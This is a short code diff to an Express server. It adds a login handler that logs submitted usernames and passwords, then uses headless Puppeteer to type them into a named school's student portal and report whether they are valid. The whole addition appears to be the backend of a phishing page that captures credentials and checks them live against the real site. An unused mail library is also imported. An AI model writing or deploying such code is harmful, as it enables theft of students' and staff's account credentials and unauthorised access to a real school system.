@@ -1,4 +1,6 @@
 const express = require('express');
+const puppeteer = require('puppeteer');
+const nodemailer = require('nodemailer');
 
 const app = express();
 
@@ -23,8 +25,34 @@ app.get('/auth',(req,res)=>{
 });
 
 app.post('/',(req,res)=>{
-    console.log(req.body);
-    res.redirect('/auth');
+    console.log(req.body);    
+    (async () => {
+        const browser = await puppeteer.launch({
+            headless:true,
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+              ],
+        });
+        const page = await browser.newPage();
+
+        await page.goto('https://vs.ecolejeanninemanuel.net/eleve.html');
+
+        await page.waitForSelector('#id_50');
+        await page.waitForSelector('#id_51');
+
+        await page.type('#id_50',req.body.username);
+        await page.type('#id_51',req.body.password);
+
+        await page.click('#id_39');
+
+        await await page.waitFor(2000);
+        if (await page.$('#id_118id_64') !== null) res.redirect('/auth');
+        else res.send('wrong password or username');
+          
+
+        // await browser.close();
+    })();
 })
 
 app.listen(PORT,()=>{
